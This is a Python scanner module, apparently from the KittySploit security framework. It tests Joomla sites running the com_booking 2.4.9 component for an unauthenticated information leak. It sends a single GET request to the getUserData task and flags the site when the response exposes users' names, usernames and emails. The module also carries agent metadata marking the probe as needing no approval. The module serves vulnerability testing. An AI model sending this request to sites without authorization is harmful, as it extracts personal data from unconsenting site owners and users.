#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Joomla! com_booking component suffers from Information leak vulnerability in which sensitive or confidential d."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! com_booking component 2.4.9 - Information Leak Detection',
        'description': 'Joomla! com_booking component suffers from Information leak vulnerability in which sensitive or confidential data is unintentionally exposed or made accessible to unauthorized individuals or systems.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'joomla', 'info-leak', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/51595',
            'http://www.artio.net/downloads/joomla/book-it/book-it-2-free/download',
        ],
    }

    def run(self):
        path = '/index.php?option=com_booking&controller=customer&task=getUserData&id=123'
        r = self.http_request(method='GET', path=path, allow_redirects=True)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"name":', '"username":', '"email":',)
        header_any = ('text/html',)
        body_regexes = ('^{.*}$',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='Joomla! com_booking component 2.4.9 - Information Leak detected', path=path)
            return True
        return False

